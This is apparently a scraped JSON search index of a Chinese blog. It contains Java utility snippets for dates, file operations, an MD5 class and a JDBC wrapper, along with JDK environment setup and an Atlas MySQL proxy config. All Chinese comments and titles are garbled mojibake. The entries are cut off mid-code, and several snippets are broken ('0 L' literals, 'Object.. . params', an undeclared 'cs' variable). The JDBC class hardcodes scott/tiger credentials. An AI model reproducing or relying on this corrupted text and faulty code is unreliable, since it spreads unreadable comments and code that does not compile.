å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ—¥æœŸç±»å‹ * @param strDate å­—ç¬¦å‹æ—¥æœŸ * @return Date æ—¥æœŸç±»å‹æ—¶é—´ */ public static Date formatStrToDate(String strDate) { SimpleDateFormat format; if (strDate.trim().equals(\"\" )) return null ; try { format = new SimpleDateFormat(\"yyyy-MM-dd\" , Locale . getDefault()); return format.parse(strDate); } catch (Exception ex) { return null ; } } /** * å°†æ—¥æœŸè½¬æ¢æˆé•¿æ•´å‹ * @param p_date æ—¥æœŸå‹æ—¶é—´ * @return long é•¿æ•´å‹æ—¶é—´ */ public static long formatDateToInt(Date p_date) { if (p_date != null) { return p_date.getTime() / 1000; } return 0; } /** * å°†å­—ç¬¦ä¸²æ—¥æœŸè½¬æ¢æˆé•¿æ•´ç±»å‹æ—¥æœŸ * @param strDate å­—ç¬¦ä¸²å‹æ—¶é—´ * @return long é•¿æ•´å‹æ—¶é—´ */ public static long formatDateStringToInt(String strDate) { SimpleDateFormat format; Date time; if (strDate.trim().equals(\"\" )) return -1; String strAry[] = strDate.split( \":\"); if (strAry.length \u003e 1) format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\" , Locale . getDefault()); else format = new SimpleDateFormat(\"yyyy-MM-dd\" , Locale.getDefault()); try { time = format.pa","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/:0:0","tags":["linux","java","scripts"],"title":"Javaæ—¥æœŸæ ¼å¼åŒ–å¤„ç†ç»„ä»¶","uri":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"æ–‡ä»¶å¤„ç†ç»„ä»¶","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/","tags":["linux","java","scripts"],"title":"javaæ–‡ä»¶å¤„ç†ç»„ä»¶","uri":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":" import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.FileWriter; import java.io.IOException; import java.io.InputStream; import java.io.PrintWriter; import com.ultrapower.eoms.common.RecordLog; /** * æ–‡ä»¶å¤„ç†ç»„ä»¶ * @version Apr 21, 2010 5:50:00 PM */ public class FileOperUtil { /** * åˆ é™¤ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ * @param path æ–‡ä»¶å¤¹è·¯å¾„ * @exception Exception */ public static void deleteFile(String path) throws Exception { File file = new File(path); if (file.isDirectory()) { File[] files = file.listFiles(); int len = files.length ; for (int i = 0; i \u003c len; i++) { deleteFile(files[i].getAbsolutePath()); } } file.delete(); } /** * æ–°å»ºç›®å½• * @param folderPath æ–‡ä»¶å¤¹è·¯å¾„ ä¾‹å¦‚:c:/test */ public static void newFolder(String folderPath) { try { String filePath = folderPath; filePath = filePath.toString(); java.io.File myFilePath = new java.io.File(filePath); if (!myFilePath.exists()) { myFilePath.mkdir(); } } catch (Exception e) { RecordLog.printLog(\"æ–°å»ºç›®å½•,\"+folderPath+ \",å‡ºé”™,\"+e.getMessage(), RecordLog.LOG_LEVEL_ERROR); e.printStackTrace(); } } /** * æ–°å»ºæ–‡ä»¶ * @param filePathAndName æ–‡ä»¶è·¯å¾„ ä¾‹å¦‚:c:/test/a.txt * @param fileContent æ–‡ä»¶çš„å†…å®¹ * @throws IOException */ public static void newFile(String filePathAndName, String fileContent) throws IOException { String filePath = filePathAndName; filePath = filePath.toString(); File myFilePath = new File(filePath); if (!myFilePath.exists()) { myFilePath.createNewFile(); } FileWriter resultFile = new FileWriter(myFilePath); PrintWriter myFile = new PrintWriter(resultFile); String strContent = fileContent; myFile.println(strContent); resultFile.close(); } /** * åˆ é™¤æ–‡ä»¶ * * @param filePathAndName * æ–‡ä»¶è·¯å¾„ ä¾‹å¦‚:c:/test/a.txt */ public static void delFile(String filePathAndName) { try { String filePath = filePathAndName; filePath = filePath.toString(); java.io.File myDelFile = new java.io.File(filePath); myDelFile.delete(); } catch (Exception e) { RecordLog.printLog(\"åˆ é™¤æ–‡ä»¶,\"+filePathAndName+ \",å‡ºé”™,\"+e.getMessage(), RecordLog.LOG_LEVEL_ERROR); e.printStackTrace(); } } /** * åˆ é™¤æ–‡ä»¶å¤¹ * @param folderPath æ–‡ä»¶å¤¹è·¯å¾„ ä¾‹å¦‚:c:/test * @return å¦‚æœåˆ é™¤æˆåŠŸ,åˆ™è¿”å› true;å¦åˆ™è¿”å› falseã€‚ */ public static boolean delFolder(String folderPath) { boolean flag = false; try { delAllFile(folderPath); //åˆ é™¤å®Œé‡Œé¢æ‰€æœ‰å†…å®¹ String filePath = folderPath; filePath = filePath.toString(); java.io.File myFilePath = new java.io.File(filePath); flag = myFilePath.delete(); //åˆ é™¤ç©ºæ–‡ä»¶å¤¹ } catch (Exception e) { RecordLog.printLog(\"åˆ é™¤æ–‡ä»¶å¤¹,\"+folderPath+\",å‡ºé”™,\" +e.getMessage(), RecordLog .LOG_LEVEL_ERROR); e.printStackTrace(); } return flag; } /** * åˆ é™¤æ–‡ä»¶å¤¹é‡Œé¢çš„æ‰€æœ‰æ–‡ä»¶ * @param path æ–‡ä»¶å¤¹è·¯å¾„ ä¾‹å¦‚:c:/test */ public static void delAllFile(String path) { File file = new File(path); if (!file.exists()) { return; } if (!file.isDirectory()) { return; } String[] tempList = file.list(); File temp = null; for (int i = 0; i \u003c tempList.length; i++) { if (path.endsWith(File.separator)) { temp = new File(path + tempList[i]); } else { temp = new File(path + File.separator + tempList[i]); } if (temp.isFile()) { temp.delete(); } if (temp.isDirectory()) { delAllFile(path + \"/\" + tempList[i]); // å…ˆåˆ é™¤æ–‡ä»¶å¤¹é‡Œé¢çš„æ–‡ä»¶ delFolder(path + \"/\" + tempList[i]); // å†åˆ é™¤ç©ºæ–‡ä»¶å¤¹ } } } /** * å¤åˆ¶å•ä¸ªæ–‡ä»¶ * @param oldPath æ–‡ä»¶å¤¹è·¯å¾„ ä¾‹å¦‚:c:/test/a.txt * @param newPath æ–‡ä»¶å¤¹è·¯å¾„ ä¾‹å¦‚:c:/test/a.txt * @throws IOException */ public static void copyFile(String oldPath, String newPath) throws IOException { int bytesum = 0; int byteread = 0; File oldfile = new File(oldPath); if (oldfile.exists()) { // æ–‡ä»¶å­˜åœ¨æ—¶ InputStream inStream = new FileInputStream(oldPath); // è¯»å…¥åŸæ–‡ä»¶ FileOutputStream fs = new FileOutputStream(newPath); byte[] buffer = new byte[1444]; while ((byteread = inStream.read(buffer)) != -1) { bytesum += byteread; // å­—èŠ‚æ•° æ–‡ä»¶å¤§å° System. out.println(bytesum); fs.write(buffer, 0, byteread); } inStream.close(); } } /** * å¤åˆ¶æ•´ä¸ªæ–‡ä»¶å¤¹å†…å®¹ * @param oldPath æ–‡ä»¶å¤¹è·¯å¾„ ä¾‹å¦‚:c:/test * @param newPath æ–‡ä»¶å¤¹è·¯å¾„ ä¾‹å¦‚:c:/abc */ public static void copyFolder(String oldPath, String newPath) { try { ( new File(newPath)).mkdirs(); // å¦‚æœæ–‡ä»¶å¤¹ä¸å­˜åœ¨ åˆ™å»ºç«‹æ–°æ–‡ä»¶å¤¹ Fi","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/:0:0","tags":["linux","java","scripts"],"title":"javaæ–‡ä»¶å¤„ç†ç»„ä»¶","uri":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"Md5åŠ å¯†ç®—æ³•","date":"2022-06-24","objectID":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/","tags":["linux","java","scripts"],"title":"javaä¸‹çš„Md5åŠ å¯†ç®—æ³•","uri":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"java ä¸‹çš„ MD5 ç®—æ³• /************************************************ MD5 ç®—æ³•çš„Java Bean @author:Topcat Tuppin Last Modified:10,Mar,2001 *************************************************/ import java.lang.reflect.*; /************************************************* md5 ç±»å®ç°äº†RSA Data Security, Inc.åœ¨æäº¤ç»™IETF çš„RFC1321ä¸­çš„MD5 message -digest ç®—æ³•ã€‚ *************************************************/ public class MD5 { /* ä¸‹é¢è¿™äº›S11-S44å®é™…ä¸Šæ˜¯ä¸€ä¸ª4*4çš„çŸ©é˜µï¼Œåœ¨åŸå§‹çš„Cå®ç°ä¸­æ˜¯ç”¨#define å®ç°çš„ï¼Œ è¿™é‡ŒæŠŠå®ƒä»¬å®ç°æˆä¸ºstatic finalæ˜¯è¡¨ç¤ºäº†åªè¯»ï¼Œåˆ‡èƒ½åœ¨åŒä¸€ä¸ªè¿›ç¨‹ç©ºé—´å†…çš„å¤šä¸ª Instanceé—´å…±äº«*/ static final int S11 = 7; static final int S12 = 12; static final int S13 = 17; static final int S14 = 22; static final int S21 = 5; static final int S22 = 9; static final int S23 = 14; static final int S24 = 20; static final int S31 = 4; static final int S32 = 11; static final int S33 = 16; static final int S34 = 23; static final int S41 = 6; static final int S42 = 10; static final int S43 = 15; static final int S44 = 21; static final byte[] PADDING = {-128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; /* ä¸‹é¢çš„ä¸‰ä¸ªæˆå‘˜æ˜¯MD5è®¡ç®—è¿‡ç¨‹ä¸­ç”¨åˆ°çš„3ä¸ªæ ¸å¿ƒæ•°æ®ï¼Œåœ¨åŸå§‹çš„Cå®ç°ä¸­ è¢«å®šä¹‰åˆ°MD5_CTXç»“æ„ä¸­ */ private long[] state = new long[4]; // state (ABCD) private long[] count = new long[2]; // number of bits, modulo 2^64 (lsb first) private byte[] buffer = new byte[64]; // input buffer /* digestHexStræ˜¯MD5çš„å”¯ä¸€ä¸€ä¸ªå…¬å…±æˆå‘˜ï¼Œæ˜¯æœ€æ–°ä¸€æ¬¡è®¡ç®—ç»“æœçš„ 16è¿›åˆ¶ASCIIè¡¨ç¤º. */ public String digestHexStr; /* digest,æ˜¯æœ€æ–°ä¸€æ¬¡è®¡ç®—ç»“æœçš„2è¿›åˆ¶å†…éƒ¨è¡¨ç¤ºï¼Œè¡¨ç¤º128bitçš„MD5å€¼. */ private byte[] digest = new byte[16]; /* getMD5ofStræ˜¯ç±»MD5æœ€ä¸»è¦çš„å…¬å…±æ–¹æ³•ï¼Œå…¥å£å‚æ•°æ˜¯ä½ æƒ³è¦è¿›è¡ŒMD5å˜æ¢çš„å­—ç¬¦ä¸² è¿”å›çš„æ˜¯å˜æ¢å®Œçš„ç»“æœï¼Œè¿™ä¸ªç»“æœæ˜¯ä»å…¬å…±æˆå‘˜digestHexStrå–å¾—çš„ï¼ */ public String getMD5ofStr(String inbuf) { md5Init(); md5Update(inbuf.getBytes(), inbuf.length()); md5Final(); digestHexStr = \"\"; for (int i = 0; i \u003c 16; i++) { digestHexStr += byteHEX(digest[i]); } return digestHexStr; } // è¿™æ˜¯MD5è¿™ä¸ªç±»çš„æ ‡å‡†æ„é€ å‡½æ•°ï¼ŒJavaBeanè¦æ±‚æœ‰ä¸€ä¸ªpublicçš„å¹¶ä¸”æ²¡æœ‰å‚æ•°çš„æ„é€ å‡½æ•° public MD5() { md5Init(); return; } /* md5Initæ˜¯ä¸€ä¸ªåˆå§‹åŒ–å‡½æ•°ï¼Œåˆå§‹åŒ–æ ¸å¿ƒå˜é‡ï¼Œè£…å…¥æ ‡å‡†çš„å¹»æ•° */ private void md5Init() { count[0] = 0 L; count[1] = 0 L; ///* Load magic initialization constants. state[0] = 0x67452301 L; state[1] = 0xefcdab89 L; state[2] = 0x98badcfe L; state[3] = 0x10325476 L; return; } /* F, G, H ,I æ˜¯4ä¸ªåŸºæœ¬çš„MD5å‡½æ•°ï¼Œåœ¨åŸå§‹çš„MD5çš„Cå®ç°ä¸­ï¼Œç”±äºå®ƒä»¬æ˜¯ ç®€å•çš„ä½è¿ç®—ï¼Œå¯èƒ½å‡ºäºæ•ˆç‡çš„è€ƒè™‘æŠŠå®ƒä»¬å®ç°æˆäº†å®ï¼Œåœ¨javaä¸­ï¼Œæˆ‘ä»¬æŠŠå®ƒä»¬ å®ç°æˆäº†privateæ–¹æ³•ï¼Œåå­—ä¿æŒäº†åŸæ¥Cä¸­çš„ã€‚ */ private long F(long x, long y, long z) { return (x \u0026 y) | ((~x) \u0026 z); } private long G(long x, long y, long z) { return (x \u0026 z) | (y \u0026 (~z)); } private long H(long x, long y, long z) { return x ^ y ^ z; } private long I(long x, long y, long z) { return y ^ (x | (~z)); } /* FF,GG,HHå’ŒIIå°†è°ƒç”¨F,G,H,Iè¿›è¡Œè¿‘ä¸€æ­¥å˜æ¢ FF, GG, HH, and II transformations for rounds 1, 2, 3, and 4. Rotation is separate from addition to prevent recomputation. */ private long FF(long a, long b, long c, long d, long x, long s, long ac) { a += F(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } private long GG(long a, long b, long c, long d, long x, long s, long ac) { a += G(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } private long HH(long a, long b, long c, long d, long x, long s, long ac) { a += H(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } private long II(long a, long b, long c, long d, long x, long s, long ac) { a += I(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } /* md5Updateæ˜¯MD5çš„ä¸»è®¡ç®—è¿‡ç¨‹ï¼Œ inbufæ˜¯è¦å˜æ¢çš„å­—èŠ‚ä¸²ï¼Œ inputlenæ˜¯é•¿åº¦ï¼Œè¿™ä¸ª å‡½æ•°ç”±getMD5ofStrè°ƒç”¨ï¼Œè°ƒç”¨ä¹‹å‰éœ€è¦è°ƒç”¨md5initï¼Œå› æ­¤æŠŠå®ƒè®¾è®¡æˆprivateçš„ */ private void md5Update(byte[] inbuf, int inputLen) { int i, index, partLen; byte[] block = new byte[64]; index = (int)(count[0] \u003e\u003e\u003e 3) \u0026 0x3F; // /* Update number of bits */ if ((count[0] += (inputLen \u003c\u003c 3)) \u003c (inputLen \u003c\u003c 3)) count[1]++; count[1] += (inputLen \u003e\u003e\u003e 29); partLen = 64 - index; // Transform as many times as possible. if (inputLen \u003e= partLen) { md5Memcpy(buffer, inbuf, index, 0, partLen); md5Transform(buffer); for (i = partLen; i + 63 \u003c inputLen; i += 64","date":"2022-06-24","objectID":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/:0:0","tags":["linux","java","scripts"],"title":"javaä¸‹çš„Md5åŠ å¯†ç®—æ³•","uri":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"Java Jdbcè¿æ¥å°è£…","date":"2022-06-24","objectID":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/","tags":["linux","java","scripts"],"title":"Jdbcè¿æ¥å°è£…","uri":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"java çš„jdbc è¿æ¥å°è£… import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.sql.CallableStatement; import java.sql.ResultSet; import java.sql.SQLException; import java.sql.Timestamp; import java.util.ArrayList; import java.util.Date; import java.util.List; import com.sun.corba.se.spi.orbutil.fsm.Guard.Result; public class DB { // æ•°æ®åº“é©±åŠ¨ç±» private final static String DRIVER_NAME = \"oracle.jdbc.driver.OracleDriver\"; // æ•°æ®åº“URLåœ°å€ private static final String URL = \"jdbc:oracle:thin:@localhost:1521:orcl\"; // æ•°æ®åº“ç”¨æˆ·å private static final String USERNAME = \"scott\"; // å¯†ç  private static final String PASSWORD = \"tiger\"; private Connection con = null; private PreparedStatement ps = null; private ResultSet rs = null; static { try { Class.forName(DRIVER_NAME); } catch (ClassNotFoundException e) { e.printStackTrace(); } } /** * è·å¾—æ•°æ®åº“è¿æ¥ * * @return æ•°æ®åº“è¿æ¥ */ public Connection getConnection() throws ClassNotFoundException, SQLException { if (con == null) { con = DriverManager.getConnection(URL, USERNAME, PASSWORD); } return con; } public ResultSet executeQuery(String sql, Object...params) throws ClassNotFoundException, SQLException { con = this.getConnection(); ps = con.prepareStatement(sql); for (int i = 0; i \u003c params.length; i++) { Object o = params[i]; if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } rs = ps.executeQuery(); return rs; } /** * æ‰§è¡ŒæŸ¥è¯¢æ“ä½œï¼Œè¿”å›ä¸€ä¸ªç»“æœæ¥ * * @param sql è¦æ‰§è¡Œçš„SQLè¯­å¥ * @param list SQLå‚æ•°çš„é›†åˆ * @return ç»“æœé›† * @throws SQLException * @throws ClassNotFoundException */ public ResultSet executeQuery(String sql, List list) throws ClassNotFoundException, SQLException { con = this.getConnection(); // è·å¾—é¢„ç¼–è¯‘è¯­å¥å¯¹è±¡ ps = con.prepareStatement(sql); // ä¼ é€’å‚æ•° if (list != null) { for (int i = 0; i \u003c list.size(); i++) { Object o = list.get(i); if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } } rs = ps.executeQuery(); return rs; } public int executeUpdate(String sql, Object...params) throws ClassNotFoundException, SQLException { con = this.getConnection(); ps = con.prepareStatement(sql); for (int i = 0; i \u003c params.length; i++) { Object o = params[i]; if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } return ps.executeUpdate(); } /** * æ‰§è¡Œå¢åˆ æ”¹è¯­å¥ï¼Œè¿”å›å—å½±å“çš„è¡Œæ•° * @param sql sqlè¯­å¥ * @param list sqlè¯­å¥çš„å‚æ•°é›†åˆ */ public int executeUpdate(String sql, List list) throws ClassNotFoundException, SQLException { con = this.getConnection(); ps = con.prepareStatement(sql); if (list != null) { for (int i = 0; i \u003c list.size(); i++) { Object o = list.get(i); if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } } return ps.executeUpdate(); } /** * æ— å‚æ•°çš„å­˜å‚¨è¿‡ç¨‹ * * @throws SQLException * @throws ClassNotFoundException */ public void prepareCall(String storename, Object... params) throws ClassNotFoundException, SQLException { con = this.getConnection(); String str = \" call \"+ storename; cs = con.prepareCall(str); for (int i = 0; i \u003c params.length; i++) { Object o = params[i]; if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); cs.setTimestamp(i + 1, t); } else { cs.setObject(i + 1, o); } } cs.execute(); } /** * è°ƒç”¨æœ‰è¾“å‡ºå‚æ•° (è¾“å‡ºå‚æ•°ç±»å‹åªèƒ½ä¸ºStirngç±»å‹çš„æ•°æ®)çš„å­˜å‚¨è¿‡ç¨‹ * * @throws List\u003cInteger\u003e æŒ‡å®šæ³¨å†Œç±»å‹ * @throws SQLException * @throws ClassNotFoundException */ public List\u003cString\u003e prepareCall(String storename, List\u003cInteger\u003e list, Object.. . params) throws ClassNotFoundException, SQLException { con = this.getConnection(); String str = \" call \"+ storename; cs = con.prepareCall(str); List\u003cInteger\u003e klist = new ArrayList\u003cInteger\u003e(); List\u003cString\u003e relist = new ArrayList\u003cString\u003e(); if (params.length != 0) { for (int i = 0; i \u003c params.length; i++) { Ob","date":"2022-06-24","objectID":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/:0:0","tags":["linux","java","scripts"],"title":"Jdbcè¿æ¥å°è£…","uri":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Jdkç¯å¢ƒå˜é‡é…ç½®","date":"2022-06-24","objectID":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/","tags":["linux","java"],"title":"JDKç¯å¢ƒå˜é‡é…ç½®","uri":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"windows æ–°å»ºJAVA_HOMEå˜é‡ï¼šJAVA_HOME=C:\\Program Files\\Java\\jdk1.8.0_191 æ–°å»ºCLASSPATHå˜é‡ï¼Œå˜é‡å€¼ä¸ºï¼š.;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\tools.jar åœ¨pathå˜é‡æ·»åŠ å˜é‡å€¼ï¼š%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin linux 1. é…ç½®æ–‡ä»¶æ–¹å¼ä¿®æ”¹ [root@00 ~]# vi /etc/profile ## vi ~/.bash_profile export JAVA_HOME=/opt/java_1.8.0_45 export PATH=$JAVA_HOME/bin:$PATH export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar [root@00 ~]# source /etc/profile ## source ~/.bash_profile 2. é€šè¿‡å‘½ä»¤update-alternatives ç®¡ç† å¤šç‰ˆæœ¬å…±å­˜æ—¶åˆ‡æ¢å¾ˆæ–¹ä¾¿ï¼š http://www.open-open.com/lib/view/open1452089422355.html ## ç¬¬ä¸€ä¸ªå‚æ•°--installè¡¨ç¤ºå‘update-alternativesæ³¨å†ŒæœåŠ¡åã€‚ ## ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ³¨å†Œæœ€ç»ˆåœ°å€ï¼ŒæˆåŠŸåå°†ä¼šæŠŠå‘½ä»¤åœ¨è¿™ä¸ªå›ºå®šçš„ç›®çš„åœ°å€åšçœŸå®å‘½ä»¤çš„è½¯é“¾ï¼Œä»¥åç®¡ç†å°±æ˜¯ç®¡ç†è¿™ä¸ªè½¯é“¾ï¼› ## ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šæœåŠ¡åï¼Œä»¥åç®¡ç†æ—¶ä»¥å®ƒä¸ºå…³è”ä¾æ®ã€‚ ## ç¬¬å››ä¸ªå‚æ•°ï¼Œè¢«ç®¡ç†çš„å‘½ä»¤ç»å¯¹è·¯å¾„ã€‚ ## ç¬¬äº”ä¸ªå‚æ•°ï¼Œä¼˜å…ˆçº§ï¼Œæ•°å­—è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ã€‚ [root@00 ~]# update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_121/bin/java 1070 [root@00 ~]# update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_121/bin/javac 1070 [root@00 ~]# update-alternatives --install /usr/bin/jar jar /opt/jdk1.8.0_121/bin/jar 1070 [root@00 ~]# update-alternatives --install /usr/bin/javah javah /opt/jdk1.8.0_121/bin/javah 1070 [root@00 ~]# update-alternatives --install /usr/bin/javap javap /opt/jdk1.8.0_121/bin/javap 1070 [root@00 ~]# update-alternatives --config java ","date":"2022-06-24","objectID":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/:0:0","tags":["linux","java"],"title":"JDKç¯å¢ƒå˜é‡é…ç½®","uri":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysql Atlasé«˜å¯ç”¨è½¯ä»¶","date":"2022-06-24","objectID":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/","tags":["linux","mysql"],"title":"Mysql Atlasé«˜å¯ç”¨è½¯ä»¶","uri":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Atlas ä¸»è¦åŠŸèƒ½ è¯»å†™åˆ†ç¦» ä»åº“è´Ÿè½½å‡è¡¡ IP è¿‡æ»¤ SQL è¯­å¥é»‘ç™½åå• è‡ªåŠ¨åˆ†è¡¨ https://github.com/Qihoo360/Atlas æ¥ MHA é«˜å¯ç”¨é›†ç¾¤åï¼Œè½¯ä»¶ä¹Ÿå¯å•ç‹¬ä½¿ç”¨ æ³¨æ„äº‹é¡¹: Atlas åªèƒ½è¿è¡Œåœ¨ x64 ç³»ç»Ÿä¸Š Mysql ç‰ˆæœ¬åº”å¤§äº 5.1,å»ºè®®ä½¿ç”¨ 5.6 ä»¥ä¸Š å®‰è£… $\u003e yum install Atlas-2.2.1.el6.x86_64.rpm # é…ç½®æ–‡ä»¶(å¯åŠ¨æ€ä¿®æ”¹ï¼Œä¸ç”¨é‡å¯) $\u003e cd /usr/local/mysql-proxy/conf \u0026\u0026 cp -v test.cnf instance.cnf $\u003e vim /usr/local/mysql-proxy/conf/instance.cnf [mysql-proxy] # å¸¦#å·çš„ä¸ºéå¿…éœ€çš„é…ç½®é¡¹ç›® # ç®¡ç†æ¥å£çš„ç”¨æˆ·å admin-username = user # ç®¡ç†æ¥å£çš„å¯†ç  admin-password = pwd # Atlasåç«¯è¿æ¥çš„MySQLä¸»åº“çš„IPå’Œç«¯å£ï¼Œå¯è®¾ç½®å¤šé¡¹ï¼Œç”¨é€—å·åˆ†éš” ## æä¾›å†™å…¥æœåŠ¡(ä¸€èˆ¬ä¸ºä¸»åº“)çš„åœ°å€ï¼Œå»ºè®®VIPçš„åœ°å€ proxy-backend-addresses = 10.0.2.9:3306 #Atlasåç«¯è¿æ¥çš„MySQLä»åº“çš„IPå’Œç«¯å£ï¼Œ@åé¢çš„æ•°å­—ä»£è¡¨æƒé‡ï¼Œç”¨æ¥ä½œè´Ÿè½½å‡è¡¡ï¼Œè‹¥çœç•¥åˆ™é»˜è®¤ä¸º1ï¼Œå¯è®¾ç½®å¤šé¡¹ï¼Œç”¨é€—å·åˆ†éš” ## åªè¯»(ä»åº“)åº“çš„åœ°å€ proxy-read-only-backend-addresses = 10.0.2.25:3305@1,10.0.2.27:3305@1 #ç”¨æˆ·åä¸å…¶å¯¹åº”çš„åŠ å¯†è¿‡çš„MySQLå¯†ç ï¼Œå¯†ç ä½¿ç”¨PREFIX/binç›®å½•ä¸‹çš„åŠ å¯†ç¨‹åºencryptåŠ å¯†ï¼Œä¸‹è¡Œçš„user1å’Œuser2ä¸ºç¤ºä¾‹ï¼Œå°†å…¶æ›¿æ¢ä¸ºä½ çš„MySQLçš„ç”¨æˆ·åå’ŒåŠ å¯†å¯†ç ï¼ # æ­¤å¤„é…çš„çš„å¯†ç ä¸ºå‰ç«¯DBAã€ç¨‹åºç­‰ç”¨æˆ·è¿æ¥mysqlçš„ç”¨æˆ·åå¯†ç ï¼Œå¿…é¡»åœ¨æ­¤å¤„å£°æ˜ä¸€ä¸‹ pwds = user1:+jKsgB3YAG8=, user2:GS+tr4TPgqc= #è®¾ç½®Atlasçš„è¿è¡Œæ–¹å¼ï¼Œè®¾ä¸ºtrueæ—¶ä¸ºå®ˆæŠ¤è¿›ç¨‹æ–¹å¼ï¼Œè®¾ä¸ºfalseæ—¶ä¸ºå‰å°æ–¹å¼ï¼Œä¸€èˆ¬å¼€å‘è°ƒè¯•æ—¶è®¾ä¸ºfalseï¼Œçº¿ä¸Šè¿è¡Œæ—¶è®¾ä¸ºtrue,trueåé¢ä¸èƒ½æœ‰ç©ºæ ¼ã€‚ daemon = true #è®¾ç½®Atlasçš„è¿è¡Œæ–¹å¼ï¼Œè®¾ä¸ºtrueæ—¶Atlasä¼šå¯åŠ¨ä¸¤ä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªä¸ºmonitorï¼Œä¸€ä¸ªä¸ºworkerï¼Œmonitoråœ¨workeræ„å¤–é€€å‡ºåä¼šè‡ªåŠ¨å°†å…¶é‡å¯ï¼Œè®¾ä¸ºfalseæ—¶åªæœ‰workerï¼Œæ²¡æœ‰monitorï¼Œä¸€èˆ¬å¼€å‘è°ƒè¯•æ—¶è®¾ä¸ºfalseï¼Œçº¿ä¸Šè¿è¡Œæ—¶è®¾ä¸ºtrue,trueåé¢ä¸èƒ½æœ‰ç©ºæ ¼ã€‚ keepalive = true #å·¥ä½œçº¿ç¨‹æ•°ï¼Œå¯¹Atlasçš„æ€§èƒ½æœ‰å¾ˆå¤§å½±å“ï¼Œå¯æ ¹æ®æƒ…å†µé€‚å½“è®¾ç½® 